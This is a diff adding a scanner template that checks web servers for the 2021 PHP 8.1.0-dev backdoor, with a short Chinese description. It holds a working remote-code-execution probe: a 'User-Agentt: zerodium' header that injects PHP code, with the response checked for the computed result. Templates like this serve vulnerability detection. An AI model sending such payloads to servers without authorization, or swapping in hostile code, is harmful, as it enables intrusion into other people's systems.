@@ -1,0 +1,20 @@
+name: php8.1backdoor
+manual: true
+query: app=php
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+      headers:
+        User-Agentt: zerodiumvar_dump(233*233);
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"int(54289)")
+expression: r0()
+detail:
+  author: k3vi_07@icloud.com
+  links:
+  - https://gobies.org/
+  description: PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。
+  tags: RCE
